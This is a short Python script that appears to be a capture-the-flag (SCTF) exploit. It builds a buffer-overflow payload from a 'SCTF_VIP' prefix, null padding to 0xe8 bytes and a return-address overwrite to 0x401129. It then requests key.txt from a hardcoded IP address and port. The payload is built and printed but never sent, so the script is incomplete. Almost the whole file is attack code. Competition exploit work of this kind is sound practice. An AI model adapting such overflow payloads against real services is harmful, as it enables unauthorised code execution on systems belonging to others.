import requests
from pwn import *
# pyright: reportUndefinedVariable=false

url = 'http://94.74.101.210:50451/key.txt'
target = 0x401129
payload = b'SCTF_VIP\x00'
payload = payload.ljust(0xe8,b'\x00') 
payload += b'\x29\x11\x40' + b'\x00' *8
#payload += p64(target) + b'\x00\x00'

data = payload
print(payload.decode())

response = requests.get(url)

print(response.text)


